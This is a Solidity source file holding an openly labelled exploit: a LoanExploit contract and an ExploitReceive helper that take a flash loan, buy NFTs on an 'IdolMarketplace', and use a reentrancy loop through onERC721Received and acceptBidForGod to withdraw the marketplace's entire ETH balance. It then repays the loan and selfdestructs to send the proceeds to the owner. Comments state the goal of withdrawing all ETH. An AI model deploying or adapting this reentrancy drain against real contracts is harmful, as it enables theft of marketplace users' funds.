pragma solidity ^0.8.9;

import './IdolMarketplace.sol';

contract LoanExploit {
    uint[] nfts;
    LiquidityPool public liquidityPool;
    IdolMarketplace public idolMarketplace;
    address public borrowerProxy;
    IdolMain public idolMain;
    address public owner;
    address constant ETHEREUM = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    bytes4 constant ERC721_RECEIVED = 0x150b7a02;
    uint public borrowValue;

    constructor(address payable _liquidityPool, address _borrowerProxy, address payable _idolMarketplace, address payable _idolMain) {
        liquidityPool = LiquidityPool(_liquidityPool);
        idolMarketplace = IdolMarketplace(_idolMarketplace);
        idolMain = IdolMain(_idolMain);
        borrowerProxy = _borrowerProxy;
        owner = msg.sender;
    }

    function attack(uint[] calldata _nfts, uint _borrowValue) public payable {
        for (uint i = 0; i < _nfts.length; i++) {
            nfts.push(_nfts[i]);
        }
        borrowValue = _borrowValue;
        _borrow();
    }

    function _borrow() private {
        liquidityPool.borrow(ETHEREUM, borrowValue, "");
    }

    function _repay() private {
        address(liquidityPool).call{value: borrowValue}("");
    }

    function _buyNFT() private {
        for (uint i = 0; i < nfts.length; i++) {
            (address _seller, uint _price, ) = idolMarketplace.godListings(nfts[i]);
            if (_price > 0 && _seller == idolMain.ownerOf(nfts[i])) {
                idolMarketplace.buyGod{value: _price}(nfts[i]);
            }
        }
    }

    function _reentry() private {
        // choose the first `nfts` as exploit NFT
        uint choosedNFT = nfts[0];
        ExploitReceive exploitReceive = new ExploitReceive(choosedNFT, address(idolMarketplace), address(idolMain));

        // calculate bidPrice required to withdraw all ETH in IdolMarketplace
        uint bidPrice = address(idolMarketplace).balance * 1000 / 850;
        address(exploitReceive).call{value: bidPrice}("");

        // approve idolMarketplace to use your NFT and accept the bid
        idolMain.approve(address(idolMarketplace), choosedNFT);
        idolMarketplace.acceptBidForGod(choosedNFT, 0);

        idolMarketplace.withdrawPendingFunds();
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        return ERC721_RECEIVED;
    }

    function _selfdestruct() private {
        for (uint i = 0; i < nfts.length; i++) {
            idolMain.transferFrom(address(this), owner, nfts[i]);
        }
        selfdestruct(payable(owner));
    }

    function acceptBidAgain(uint _id) public {
        idolMarketplace.acceptBidForGod(_id, 0);
    }

    fallback() external payable {
        if (msg.sender == borrowerProxy && address(this).balance >= borrowValue) {
            _buyNFT();
            _reentry();
            _repay();
            _selfdestruct();
        }
    }

}


contract ExploitReceive {
    IdolMarketplace public idolMarketplace;
    IdolMain public idolMain;
    LoanExploit public loanExploit;
    bytes4 constant ERC721_RECEIVED = 0x150b7a02;
    uint public id;
    uint public price;
    bool public reentrancy;

    constructor(uint _id, address _idolMarketplace, address _idolMain) {
        idolMarketplace = IdolMarketplace(payable(_idolMarketplace));
        idolMain = IdolMain(payable(_idolMain));
        loanExploit = LoanExploit(payable(msg.sender));
        id = _id;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns(bytes4) {
        idolMain.transferFrom(address(this), address(loanExploit), id);
        if (reentrancy == false) {
            reentrancy = true;
            loanExploit.acceptBidAgain(id);
        }
        return ERC721_RECEIVED;
    }

    fallback() external payable {
        price = msg.value;
        idolMarketplace.enterBidForGod{value: price}(id);
    }
}


contract LiquidityPool  {
    function borrow(address _token, uint256 _amount, bytes calldata _data) external { }
}
